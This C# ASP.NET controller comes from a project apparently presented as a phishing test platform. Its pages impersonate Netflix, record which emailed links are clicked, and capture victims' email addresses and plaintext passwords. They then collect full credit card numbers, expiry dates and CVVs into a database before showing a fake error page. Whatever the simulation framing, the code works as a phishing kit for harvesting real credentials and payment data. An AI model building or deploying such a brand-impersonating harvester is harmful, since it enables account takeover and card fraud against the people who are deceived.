using Microsoft.AspNetCore.Mvc;
using Microsoft.EntityFrameworkCore;
using PhishingTestPlatform.Data;
using PhishingTestPlatform.Data.Models;
using PhishingTestPlatform.UI.Views.Models;

namespace PhishingTestPlatform.UI.Controllers
{
    public class NetflixController : Controller
    {
        private readonly PhishingDbContext _context;

        public NetflixController(PhishingDbContext context)
        {
            _context = context;
        }

        public async Task<IActionResult> IndexAsync(Guid id)
        {
            var phishingEmailSend = await _context.PhishingEmailsSend.FirstOrDefaultAsync(x => x.Id == id);
            var phishingInfo = await _context.PhishingInfo.FirstOrDefaultAsync(x => x.PhishingEmailSendId == id);
            if (phishingEmailSend.IsClicked && phishingInfo != null)
            {
                return RedirectToAction("Index", "Error");
            }

            phishingEmailSend.IsClicked = true;

            _context.PhishingEmailsSend.Update(phishingEmailSend);
            _context.SaveChangesAsync();

            ViewBag.Id = id;
            return View();
        }

        public async Task<IActionResult> CreditCardAsync(Guid id)
        {
            ViewBag.Id = id;
            return View();
        }

        [HttpPost]
        public async Task<IActionResult> LoginAsync(LoginViewModel loginModel)
        {
            if (ModelState.IsValid)
            {
                var phisingEmailSend = await _context.PhishingEmailsSend.FindAsync(loginModel.Id);
                var phisingUserInfo = new PhishingUserInfo
                {
                    Email = loginModel.Email,
                    Password = loginModel.Password,
                    PhishingEmailSendId = loginModel.Id,
                    PhishingEmailSend = phisingEmailSend
                };

                _context.PhishingInfo.Add(phisingUserInfo);
                _context.SaveChanges();

                return RedirectToAction("CreditCard", new { id = phisingUserInfo.Id });
            }

            return View(loginModel);
        }

        [HttpPost]
        public async Task<IActionResult> CreditCardSubmitAsync(CreditCardViewModel viewModel)
        {
            var phishingInfo = await _context.PhishingInfo.FirstOrDefaultAsync(x => x.Id == viewModel.Id);
            var name = viewModel.NameSurname.Split(" ")[0];

            phishingInfo.FirstName = viewModel.NameSurname.Split(" ")[0];
            phishingInfo.LastName = viewModel.NameSurname.Split(" ")[1];
            phishingInfo.CreditCardNumber = viewModel.CreditCardNumber;
            phishingInfo.CreditCardExpirationDateMonth = viewModel.CreditCardExpirationMonth;
            phishingInfo.CreditCardExpirationDateYear = viewModel.CreditCardExpirationYear;
            phishingInfo.CreditCardCVV = viewModel.CreditCardCVV;

            _context.PhishingInfo.Update(phishingInfo);
            _context.SaveChanges();

            return RedirectToAction("Index", "Error");
        }
    }
}
